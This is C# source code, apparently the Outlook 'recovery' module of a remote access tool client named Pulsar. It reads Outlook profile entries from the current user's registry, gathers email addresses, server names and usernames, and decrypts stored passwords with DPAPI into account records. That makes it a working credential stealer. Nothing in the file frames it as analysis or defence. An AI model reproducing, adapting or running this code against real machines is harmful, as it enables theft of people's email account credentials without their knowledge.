using Microsoft.Win32;
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Collections.Generic;
using Pulsar.Common.Models;

namespace Pulsar.Client.Recovery.Outlook
{
    public static class OutlookRecovery
    {
        private static readonly Regex MailRegex =
            new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");

        private static readonly Regex SmtpRegex =
            new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");

        private static readonly string[] RegistryPaths =
        {
            "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
            "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
        };

        private static readonly string[] MailClients =
        {
            "SMTP Email Address", "SMTP Server", "POP3 Server",
            "POP3 User Name", "SMTP User Name", "NNTP Email Address",
            "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
            "Email", "HTTP User", "HTTP Server URL", "POP3 User",
            "IMAP User", "HTTPMail User Name", "HTTPMail Server",
            "SMTP User", "POP3 Password2", "IMAP Password2",
            "NNTP Password2", "HTTPMail Password2", "SMTP Password2",
            "POP3 Password", "IMAP Password", "NNTP Password",
            "HTTPMail Password", "SMTP Password"
        };

        /// <summary>
        /// Recovers Outlook email accounts from Windows Registry
        /// </summary>
        /// <returns>List of recovered Outlook accounts</returns>
        public static List<RecoveredAccount> Recover()
        {
            var recoveredAccounts = new List<RecoveredAccount>();

            foreach (string path in RegistryPaths)
                ReadRegistryPath(path, recoveredAccounts);

            return recoveredAccounts;
        }

        /// <summary>
        /// Recovers Outlook email accounts and adds them to existing list
        /// </summary>
        /// <param name="output">List to add recovered accounts to</param>
        public static void Recover(List<RecoveredAccount> output)
        {
            var accounts = Recover();
            output.AddRange(accounts);
        }

        /// <summary>
        /// Reads a registry path for Outlook account information
        /// </summary>
        private static void ReadRegistryPath(string path, List<RecoveredAccount> output)
        {
            try
            {
                using (RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(path, false))
                {
                    if (key == null)
                        return;

                    ParseRegistryKey(key, path, output);
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Outlook Registry Error ({path}): {ex.Message}");
            }
        }

        /// <summary>
        /// Recursively parses registry keys for email account information
        /// </summary>
        private static void ParseRegistryKey(RegistryKey key, string regPath, List<RecoveredAccount> output)
        {
            Dictionary<string, string> found = new Dictionary<string, string>();
            bool valid = false;

            foreach (string c in MailClients)
            {
                try
                {
                    object value = key.GetValue(c);
                    if (value == null)
                        continue;

                    string processed = ProcessValue(c, value);
                    if (!string.IsNullOrEmpty(processed))
                    {
                        found[c] = processed;
                        valid = true;
                    }
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Outlook Value Error ({c}): {ex.Message}");
                }
            }

            if (valid)
                PushAccount(found, output);

            // Recurse into subkeys
            string[] subs = key.GetSubKeyNames();

            foreach (string sub in subs)
            {
                try
                {
                    using (RegistryKey sk = key.OpenSubKey(sub))
                    {
                        if (sk != null)
                            ParseRegistryKey(sk, regPath + "\\" + sub, output);
                    }
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Outlook Subkey Error ({sub}): {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Processes registry values and decrypts passwords when necessary
        /// </summary>
        private static string ProcessValue(string name, object val)
        {
            // Encrypted DPAPI password
            if (name.Contains("Password") && !name.Contains("2") && val is byte[])
            {
                return DecryptPassword((byte[])val);
            }

            // Byte[] string
            if (val is byte[])
            {
                string s = Encoding.UTF8.GetString((byte[])val).Replace("\0", "");
                return string.IsNullOrEmpty(s) ? null : s;
            }

            // Normal string
            string str = val.ToString();
            return string.IsNullOrEmpty(str) ? null : str;
        }

        /// <summary>
        /// Creates RecoveredAccount from dictionary of registry values
        /// </summary>
        private static void PushAccount(Dictionary<string, string> dict, List<RecoveredAccount> output)
        {
            string email = "";
            string password = "";
            string server = "";

            foreach (KeyValuePair<string, string> kv in dict)
            {
                if (MailRegex.IsMatch(kv.Value))
                    email = kv.Value;

                if (kv.Key.Contains("Password"))
                    password = kv.Value;

                if (kv.Key.Contains("Server") && SmtpRegex.IsMatch(kv.Value))
                    server = kv.Value;
            }

            if (!string.IsNullOrEmpty(email))
            {
                output.Add(new RecoveredAccount
                {
                    Application = "Microsoft Outlook",
                    Username = email,
                    Password = password,
                    Url = string.IsNullOrEmpty(server) ? "mail.server" : server
                });
            }
        }

        /// <summary>
        /// Decrypts DPAPI protected passwords
        /// </summary>
        private static string DecryptPassword(byte[] enc)
        {
            try
            {
                if (enc == null || enc.Length <= 1)
                    return null;

                byte[] decoded = new byte[enc.Length - 1];
                Buffer.BlockCopy(enc, 1, decoded, 0, decoded.Length);

                byte[] decrypted = ProtectedData.Unprotect(
                    decoded,
                    null,
                    DataProtectionScope.CurrentUser);

                return Encoding.UTF8.GetString(decrypted).Replace("\0", "");
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Outlook Password Decryption Error: {ex.Message}");
                return null;
            }
        }
    }
}